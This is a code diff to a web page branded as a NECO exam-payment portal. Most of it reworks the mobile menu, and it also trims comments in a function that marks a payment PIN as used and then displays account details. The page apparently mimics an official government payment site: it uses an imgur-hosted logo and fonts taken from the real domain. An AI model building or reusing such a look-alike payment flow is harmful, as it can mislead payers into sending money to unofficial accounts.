@@ -39,6 +39,65 @@
             .container { max-width: 1280px; padding-right: 2rem; padding-left: 2rem; }
         }
         
+        /* ===== MOBILE MENU STYLES - SAME AS HOME PAGE ===== */
+        
+        /* Make the logo area expandable */
+        .logo-area {
+            transition: all 0.3s ease;
+            background: white;
+            border-radius: 12px;
+            width: 100%;
+        }
+        
+        /* Mobile menu item - hidden by default */
+        .mobile-menu-item {
+            max-height: 0;
+            opacity: 0;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            padding: 0 0 0 0;
+            margin-top: 0;
+        }
+        
+        /* When expanded, show the menu item */
+        .mobile-menu-item.expanded {
+            max-height: 80px;
+            opacity: 1;
+            padding: 12px 0;
+            margin-top: 8px;
+        }
+        
+        /* Style for the mobile menu link - inside logo box, aligned left */
+        .mobile-menu-link {
+            display: block;
+            color: #4b5563;
+            text-decoration: none;
+            font-size: 18px;
+            font-weight: 500;
+            transition: all 0.2s ease;
+            text-align: left;
+            padding: 8px 0;
+        }
+        
+        .mobile-menu-link:hover {
+            color: #054c0f;
+            padding-left: 8px;
+        }
+        
+        /* LINE AT THE BOTTOM OF Back to Home */
+        .mobile-menu-item.expanded .mobile-menu-link {
+            border-bottom: 1px solid #f0f0f0;
+            padding-bottom: 12px;
+        }
+        
+        /* Logo top area */
+        .logo-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+        }
+        
         .payment-card {
             border-radius: 0.75rem;
             overflow: hidden;
@@ -415,53 +474,34 @@
         @font-face { font-family: 'CircularStdBold'; src: url('https://payments.neco.gov.ng/assets/CircularStd-Bold.0e6c076d.otf'); }
         body { font-family: 'CircularStd', system-ui, sans-serif; }
         .modal-scroll-content { max-height: 90vh; overflow-y: auto; }
-        
-        #mobileMenu {
-            position: fixed;
-            top: 70px;
-            left: 0;
-            right: 0;
-            background: white;
-            border-radius: 0;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
-            z-index: 9999;
-        }
-        #mobileMenu a {
-            display: block;
-            padding: 16px 20px;
-            color: #4b5563;
-            text-decoration: none;
-            font-size: 16px;
-            font-weight: 500;
-            text-align: center;
-        }
-        #mobileMenu a:hover { background-color: #f0fdf4; color: #054c0f; }
     </style>
 </head>
 <body>
 <div id="app">
     <div class="shadow-md bg-white sticky w-full z-10 top-0">
         <div class="container py-2">
-            <nav class="flex justify-between items-center">
-                <div class="h-14 w-14">
-                    <img src="https://i.imgur.com/cNVlGBu.jpeg" alt="NECO Logo" style="height: 56px; width: auto;">
+            <div class="logo-area" id="logoArea">
+                <div class="logo-top">
+                    <div class="h-14 w-14">
+                        <img src="https://i.imgur.com/cNVlGBu.jpeg" alt="NECO Logo" style="height: 56px; width: auto;">
+                    </div>
+                    <ul class="hidden lg:flex lg:items-center lg:gap-8">
+                        <li><a class="text-gray-600 hover:text-gray-900 text-sm font-medium" href="index.html">Back to Home</a></li>
+                    </ul>
+                    <div class="flex items-center gap-2 lg:hidden">
+                        <button type="button" id="mobileMenuBtn">
+                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-8 h-8">
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"></path>
+                            </svg>
+                        </button>
+                    </div>
                 </div>
-                <ul class="hidden lg:flex lg:items-center lg:gap-8">
-                    <li><a class="text-gray-600 hover:text-gray-900 text-sm font-medium" href="index.html">Back to Home</a></li>
-                </ul>
-                <div class="flex items-center gap-2 lg:hidden">
-                    <button type="button" id="mobileMenuBtn">
-                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-8 h-8">
-                            <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"></path>
-                        </svg>
-                    </button>
+                <!-- Mobile menu item - INSIDE the logo box, expands like home page -->
+                <div class="mobile-menu-item" id="mobileMenuItem">
+                    <a href="index.html" class="mobile-menu-link">Back to Home</a>
                 </div>
-            </nav>
+            </div>
         </div>
-    </div>
-    
-    <div id="mobileMenu" style="display: none;">
-        <a href="index.html">Back to Home</a>
     </div>
     
     <div class="container mt-20">
@@ -1000,22 +1040,15 @@
         document.getElementById('invoiceModal').style.display = 'block';
     });
     
-    // FIXED: This function shows account details WITHOUT saying PIN expired
     window.markPinAndProceed = async function() {
         const pinCode = currentFormData.paymentCode;
-        
-        // Show loading modal IMMEDIATELY
         const loadingModal = document.getElementById('loadingModal');
         loadingModal.style.display = 'flex';
         
         try {
-            // Mark PIN as used
             await markPinAsUsed(pinCode);
-            
-            // Close invoice modal
             closeInvoiceModal();
             
-            // Fetch PIN details and show account modal
             setTimeout(async () => {
                 const { data: pinData, error } = await supabase
                     .from('payment_pins')
@@ -1029,9 +1062,6 @@
                     alert("Payment code not found. Please contact support.");
                     return;
                 }
-                
-                // IMPORTANT: PIN status is 'used' - this is CORRECT, it means it was just used
-                // We DO NOT show error here - we show account details
                 
                 const usedTime = new Date(pinData.used_at);
                 const expiryTime = usedTime.getTime() + (30 * 60 * 1000);
@@ -1138,12 +1168,19 @@
     
     function escapeHtml(str) { if (!str) return ''; return String(str).replace(/[&<>]/g, m => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[m])); }
     
-    // Mobile menu
-    const menuBtn = document.getElementById('mobileMenuBtn');
-    const mobileMenu = document.getElementById('mobileMenu');
-    if (menuBtn && mobileMenu) {
-        menuBtn.onclick = () => { mobileMenu.style.display = mobileMenu.style.display === 'block' ? 'none' : 'block'; };
-        document.addEventListener('click', (e) => { if (mobileMenu.style.display === 'block' && !menuBtn.contains(e.target) && !mobileMenu.contains(e.target)) mobileMenu.style.display = 'none'; });
+    // ============ MOBILE MENU - SAME AS HOME PAGE ============
+    var menuBtn = document.getElementById('mobileMenuBtn');
+    var mobileMenuItem = document.getElementById('mobileMenuItem');
+    
+    if (menuBtn) {
+        menuBtn.onclick = function(e) {
+            e.stopPropagation();
+            if (mobileMenuItem.classList.contains('expanded')) {
+                mobileMenuItem.classList.remove('expanded');
+            } else {
+                mobileMenuItem.classList.add('expanded');
+            }
+        };
     }
     
     // Initialize
